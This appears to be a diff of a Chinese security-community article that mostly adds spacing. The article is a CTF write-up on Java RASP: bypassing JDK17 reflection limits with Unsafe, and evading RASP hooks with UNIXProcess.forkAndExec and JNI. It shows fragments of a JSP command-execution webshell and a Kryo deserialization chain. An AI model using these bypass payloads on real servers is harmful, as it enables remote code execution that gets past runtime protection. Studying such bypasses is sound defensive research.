@@ -1,8 +1,8 @@
 
 
-# 从一道题初接触RASP - 先知社区
+# 从一道题初接触 RASP - 先知社区
 
-从一道题初接触RASP
+从一道题初接触 RASP
 
 - - -
 
@@ -10,7 +10,7 @@
 
 逛公众号的时候看到的一些接触的很少的东西，顺带着学习学习。
 
-# JDK17限制反射
+# JDK17 限制反射
 
 在`JDK9`至`JDK16`版本之中，`Java.*`依赖包下所有的非公共字段和方法在进行反射调用的时候，会出现关于非法反射访问的警告，但是在`JDK17`之后，采用的是强封装，默认情况下不再允许这一类的反射，所有反射访问`java.*`的非公共字段和方法的代码将抛出`InaccessibleObjectException`异常。`Oracle`给的解释是这种反射的使用对`JDK`的**安全性**和**可维护性**产生了负面影响。
 
@@ -38,7 +38,7 @@ public class Test {
 
 [![](assets/1709789504-eb5cf7db75c12fd775440b48fe0c035e.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240305215335-c2fed7b2-daf7-1.png)
 
-# Unsafe绕过
+# Unsafe 绕过
 
 `JDK11`之前可以利用`Unsafe`来调用并加载非`public`类
 
@@ -69,13 +69,13 @@ public static void main(String[] args) throws Exception {
     }
 ```
 
-来到`JDK17`，以上的两种方法都发现被删除掉了。那么如何绕过这种反射的限制？根据`Oracle`的描述，在`sun.misc`和`sun.reflect`包可供所有`JDK版本（包括JDK17）`中的工具和库反射，所以可以利用这里面的依赖中的`Unsafe`类来绕过这种限制，`Unsafe`是位于`sun.misc`包下的一个类，主要提供一些用于执行低级别、不安全操作的方法，如直接访问系统内存资源、自主管理内存资源等，拥有了类似C语言指针一样操作内存空间的能力。
+来到`JDK17`，以上的两种方法都发现被删除掉了。那么如何绕过这种反射的限制？根据`Oracle`的描述，在`sun.misc`和`sun.reflect`包可供所有`JDK版本（包括JDK17）`中的工具和库反射，所以可以利用这里面的依赖中的`Unsafe`类来绕过这种限制，`Unsafe`是位于`sun.misc`包下的一个类，主要提供一些用于执行低级别、不安全操作的方法，如直接访问系统内存资源、自主管理内存资源等，拥有了类似 C 语言指针一样操作内存空间的能力。
 
 因为上图的异常是从`checkCanSetAccessible`方法中抛出的，所以查看`setAccessible`的处理方法：
 
 通过`Reflection.getCallerClass()`获取调用者的类的信息和各种方法，随后将获取到`caller`后与`ClassLoader`类一同传入到了`checkCanSetAccessible`方法中，在`checkCanSetAccessible`方法中，会先判断获取到的类信息是否是`MethodHandle`，如果是会抛出异常。接着通过`getModule()`获取`caller`和`ClassLoader`的`module`，如果它们两个的`module`是一致的，就会返回`True`
 
-`MethodHandle`类提供了一种在调用方法时绕过Java语言访问控制和类型检查的方式，可以用来动态调用方法、字段和构造函数。
+`MethodHandle`类提供了一种在调用方法时绕过 Java 语言访问控制和类型检查的方式，可以用来动态调用方法、字段和构造函数。
 
 [![](assets/1709789504-8eda68aa26b2cb5243715ab0e52dc7fe.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240305215000-42abaaea-daf7-1.png)
 
@@ -102,7 +102,7 @@ public class Test {
         Module baseModule=Object.class.getModule();
         Class<?> currentClass= Test.class;
         long addr=unSafeClass.objectFieldOffset(Class.class.getDeclaredField("module"));
-        unSafeClass.getAndSetObject(currentClass,addr,baseModule); //更改当前运行类的Module
+        unSafeClass.getAndSetObject(currentClass,addr,baseModule); //更改当前运行类的 Module
         Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
         defineClass.setAccessible(true);
         Class<?> calc= (Class<?>) defineClass.invoke(ClassLoader.getSystemClassLoader(), "attack", decode, 0, decode.length);
@@ -113,7 +113,7 @@ public class Test {
 
 [![](assets/1709789504-1d5ff330a5d3f1b691015cb1de797986.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240305215015-4bd7f2c2-daf7-1.png)
 
-# 关于RASP
+# 关于 RASP
 
 `RASP`全称是`Runtime applicaion self-protection`，在`2014`念提出的一种应用程序自我保护技术，将防护功能注入到应用程序之中，通过少量的`Hook`函数监测程序的运行，根据当前的上下文环境实时阻断攻击事件。
 
@@ -126,7 +126,7 @@ Instrumentation API 提供了两个核心接口：`ClassFileTransformer` 和 `In
 1.  `premain` 方法：`premain` 方法是在 Java 虚拟机启动时，在被代理的应用程序加载之前运行的。我们可以在 Agent 中的 `premain` 方法中执行一些初始化操作，并在应用程序启动之前对目标类进行修改。
 2.  `agentmain` 方法：`agentmain` 方法是在 Java 虚拟机已经启动并且应用程序正在运行时，动态地加载一个 Java Agent。通过使用 `attach API`，我们可以将 Agent 动态地附加到正在运行的 Java 进程上。这样，我们可以在应用程序运行期间对目标类进行修改。
 
-例子:
+例子：
 
 `Agent`类：
 
@@ -277,13 +277,13 @@ public class RaspTransformer implements ClassFileTransformer {
 -   通过遍历`classfileBuffer`对象中的所有方法与`ProcessImpl`匹配，如果匹配到了敏感的类方法，则在方法中插入返回`null`的代码。
 -   最终将修改完成的对象转换为字节数组并返回，表示完成对类的转换，并释放`ctClass`对象。
 
-# RASP绕过
+# RASP 绕过
 
 从上文得知，`RASP`主要是通过转换字节码来达到目的，如果设置的检测的方法存在着更底层的方法或者相同层级的不同方法能够达到相同的效果，那么就能完成绕过。比如说上文通过检测`processImpl.start`来进行保护，而在`Linux`或`Mac`系统中，还会存在着`UNIXProcess.forkAndExec()`能够达到`RCE`的效果。
 
 ## UNIXProcess
 
-至于如何实例化一个`UNIXProcess`，可以从`ProcessImpl` 中看出来，以下是这个类的源码:
+至于如何实例化一个`UNIXProcess`，可以从`ProcessImpl` 中看出来，以下是这个类的源码：
 
 ```plain
 final class ProcessImpl {
@@ -376,9 +376,9 @@ final class ProcessImpl {
 }
 ```
 
-> `UNIXProcess`接收 `8`个参数，其中`envc`是`[1]`与`std_fds`都是恒为-1的数组，`redirectErrorStream`不影响可为`false`，`args.length` 为 `cmd.length - 1`，至于`argBlock`的内容，我们赋值代码照着写即可。
+> `UNIXProcess`接收 `8`个参数，其中`envc`是`[1]`与`std_fds`都是恒为 -1 的数组，`redirectErrorStream`不影响可为`false`，`args.length` 为 `cmd.length - 1`，至于`argBlock`的内容，我们赋值代码照着写即可。
 
-一个jsp的payload：
+一个 jsp 的 payload：
 
 ```plain
 <%@ page contentType="text/html;charset=UTF-8" language="java" %>
@@ -482,13 +482,13 @@ final class ProcessImpl {
 
 [![](assets/1709789504-f071f0bb1842c9660689bfbaf2cfa9ab.png)](https://xzfile.aliyuncs.com/media/upload/picture/20240305215058-6541f28a-daf7-1.png)
 
-> 在UNIXProcess中可以看到`forkAndExec`的参数内容，多出了`lanuchMechanism`与`helperpath`，其它的参数内容与`UNIXProcess`是一致的
+> 在 UNIXProcess 中可以看到`forkAndExec`的参数内容，多出了`lanuchMechanism`与`helperpath`，其它的参数内容与`UNIXProcess`是一致的
 
 1.  使用`sun.misc.Unsafe.allocateInstance(Class)`特性可以无需`new`或者`newInstance`创建`UNIXProcess/ProcessImpl`类对象。
 2.  反射`UNIXProcess/ProcessImpl`类的`forkAndExec`方法。
 3.  通过反射构造出`ordinal`和`helperpath`参数，并构造出`forkAndExec`方法
 4.  反射`UNIXProcess/ProcessImpl`类的`initStreams`方法初始化输入输出结果流对象。
-5.  反射`UNIXProcess/ProcessImpl`类的`getInputStream`方法获取本地命令执行结果(如果要输出流、异常流反射对应方法即可)。
+5.  反射`UNIXProcess/ProcessImpl`类的`getInputStream`方法获取本地命令执行结果 (如果要输出流、异常流反射对应方法即可)。
 
 ```plain
 <%@ page contentType="text/html;charset=UTF-8" language="java" %>
@@ -515,14 +515,14 @@ final class ProcessImpl {
     if (strs != null) {
         Field theUnsafeField = Unsafe.class.getDeclaredField("theUnsafe");
         theUnsafeField.setAccessible(true);
-        Unsafe unsafe = (Unsafe) theUnsafeField.get(null); //通过get方法得到unsafe对象
+        Unsafe unsafe = (Unsafe) theUnsafeField.get(null); //通过 get 方法得到 unsafe 对象
         Class processClass = null;
         try {
             processClass = Class.forName("java.lang.UNIXProcess");
         } catch (ClassNotFoundException e) {
             processClass = Class.forName("java.lang.ProcessImpl");
         }
-        Object processObject = unsafe.allocateInstance(processClass);//创建UNIXProcess对象
+        Object processObject = unsafe.allocateInstance(processClass);//创建 UNIXProcess 对象
         //原代码
         byte[][] args = new byte[strs.length - 1][];
         int      size = args.length; 
@@ -538,16 +538,16 @@ final class ProcessImpl {
         }
         int[] envc                 = new int[1];
         int[] std_fds              = new int[]{-1, -1, -1};
-        //构造forkAndExec需要的参数
+        //构造 forkAndExec 需要的参数
         Field launchMechanismField = processClass.getDeclaredField("launchMechanism");
         Field helperpathField      = processClass.getDeclaredField("helperpath");
         launchMechanismField.setAccessible(true);
         helperpathField.setAccessible(true);
-        //从UNIXProcess中得到launchMechanism和Helperpath
+        //从 UNIXProcess 中得到 launchMechanism 和 Helperpath
         Object launchMechanismObject = launchMechanismField.get(processObject);
         byte[] helperpathObject      = (byte[]) helperpathField.get(processObject);
         int ordinal = (int) launchMechanismObject.getClass().getMethod("ordinal").invoke(launchMechanismObject);
-       //反射forkAndExec方法
+       //反射 forkAndExec 方法
         Method forkMethod = processClass.getDeclaredMethod("forkAndExec", new Class[]{
                 int.class, byte[].class, byte[].class, byte[].class, int.class,
                 byte[].class, int.class, byte[].class, int[].class, boolean.class
@@ -582,7 +582,7 @@ final class ProcessImpl {
 
 ## JNI
 
-`JNI`（Java Native Interface）是Java提供的一个用于和本地（Native）代码交互的编程接口。通过`JNI`，Java程序可以调用C、C++等本地编程语言编写的函数，并且本地代码也可以调用Java程序中的方法，原本是为了解决Java无法直接访问底层系统资源或者利用本地库的问题，这里也可以用于绕过`RASP`。通过`JNI`加载`dll`动态链接库或动态共享库`so`来达到本地执行的效果。
+`JNI`（Java Native Interface）是 Java 提供的一个用于和本地（Native）代码交互的编程接口。通过`JNI`，Java 程序可以调用 C、C++ 等本地编程语言编写的函数，并且本地代码也可以调用 Java 程序中的方法，原本是为了解决 Java 无法直接访问底层系统资源或者利用本地库的问题，这里也可以用于绕过`RASP`。通过`JNI`加载`dll`动态链接库或动态共享库`so`来达到本地执行的效果。
 
 通过`JNI`使用`dll`例子：
 
@@ -652,7 +652,7 @@ gcc -I "C:\Program Files\Java\jdk-17.0.2\include" -I "C:\Program Files\Java\jdk-
 
 ```plain
 public static void main(String[] args) {
-        System.loadLibrary("jni"); //load()指定绝对路径
+        System.loadLibrary("jni"); //load() 指定绝对路径
         Command command = new Command();
         String ipconfig = command.exec("calc");
         System.out.println(ipconfig);
@@ -803,7 +803,7 @@ public static void main(String[] args) throws Exception {
 
 因此整体的解题思路就是先通过`/coffee/demo`设置`Kryo`的`反序列化策略`和`RegistrationRequired`，最终再通过`Kryo`反序列化打链子触发`RCE`
 
-需加上的payload内容：
+需加上的 payload 内容：
 
 ```plain
 public static void main(String[] args) throws Exception {
@@ -916,4 +916,4 @@ public void shell(HttpServletRequest request, HttpServletResponse response) thro
 
 [内存马](https://myzxcg.com/2021/11/Spring-%E5%86%85%E5%AD%98%E9%A9%AC%E5%AE%9E%E7%8E%B0/#%E6%B3%A8%E5%86%8Ccontroller)
 
-[官网WP](https://github.com/BuptMerak/mrctf-2022-writeups/blob/main/offical/WEB.md)
+[官网 WP](https://github.com/BuptMerak/mrctf-2022-writeups/blob/main/offical/WEB.md)
